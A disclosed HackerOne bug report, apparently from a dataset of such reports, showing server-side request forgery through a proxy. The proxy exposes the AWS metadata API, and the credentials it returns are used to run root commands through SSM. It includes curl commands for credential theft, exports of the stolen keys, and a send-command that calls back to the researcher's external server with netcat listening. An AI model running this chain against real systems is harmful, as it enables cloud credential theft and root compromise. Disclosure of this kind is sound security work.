---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '401136'
original_report_id: '401136'
title: Remote Code Execution on Proxy Service (as root)
team_handle: redact
created_at: '2017-09-28T17:44:07.000Z'
disclosed_at: '2018-08-27T17:48:44.909Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 80
tags:
- hackerone
---

# Remote Code Execution on Proxy Service (as root)

## Metadata

- HackerOne Report ID: 401136
- Weakness: 
- Program: redact
- Disclosed At: 2018-08-27T17:48:44.909Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

The proxy service used to provide researchers with access to certain programs on ██████ allows access to AWS's Metadata API. This Metadata API in turn is configured to expose temporary AWS access credentials for the AWS EC2 Run Command role. When this role is assumed by an AWS client (e.g. the CLI), it is possible to execute arbitrary commands on AWS EC2 instances.

## Obtaining the AWS keys
First up we are going to use cURL and to proof the AWS Metadata API is accessible:

```
curl -vv http://169.254.169.254/latest/ -x '52.6.██.███:25603'
```

Here we are instructing cURL to load up AWS's Metadata API through the proxy. Since the proxy is hosted on AWS, and is not blocking traffic to internal IPs such as this API, we are able to gain access to it.

To generate a temporary pair of access keys, we will run the following command:

```
curl -vv http://169.254.169.254/latest/meta-data/iam/security-credentials/runCommand -x '52.6.██.███:25603'
```

The `runCommand` role is interesting and made me assume it was used for https://aws.amazon.com/ec2/run-command/.

## Configuring AWS CLI
You will need to have the AWS CLI installed before you can continue.

Now set the following environment variables:

```
export AWS_ACCESS_KEY_ID=<"AccessKeyId" you exposed in the last cURL command>
export AWS_SECRET_ACCESS_KEY=<"SecretAccessKey" you exposed in the last cURL commandt>
export AWS_SESSION_TOKEN=<"Token" you exposed in the last cURL command>
```

Now in the same shell session you should be able to interact with several AWS services through the CLI.

## Executing arbitrary commands as root
Since the role name was `runCommand` I immediately went for AWS EC2 Systems Manager (specifically `aws ssm send-command`).

With the access keys configured, I ran the following AWS CLI command to proof the keys indeed did have sufficient permissions to execute arbitrary commands:

```
aws ssm send-command --instance-ids "i-05b████████adaa" --document-name "AWS-RunShellScript" --comment "whoami" --parameters commands='curl 162.243.███.███:8080/`whoami`' --output text --region=us-east-1
```

On my dev server I had a netcat listener running on port 8080 (`nc -vvkl 8080`) to capture the incoming cURL request. I also chose to execute a quick `whoami` command and pass it along as the path in the cURL HTTP call so I can quickly confirm what type of user is executing these commands.

The HTTP request came in as follows:

```
Connection from [52.73.██.██] port 8080 [tcp/http-alt] accepted (family 2, sport 45163)
GET /root HTTP/1.1
User-Agent: curl/7.35.0
Host: 162.243.███.███:8080
Accept: */*
```

This was enough proof for me to conclude command execution is possible and these commands are executed as **root**.

Note that I only tried this on one instance, but I am expecting there are more instances in the `us-east-1` region that allow this type of command execution (and potentially instances in other regions as well).

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
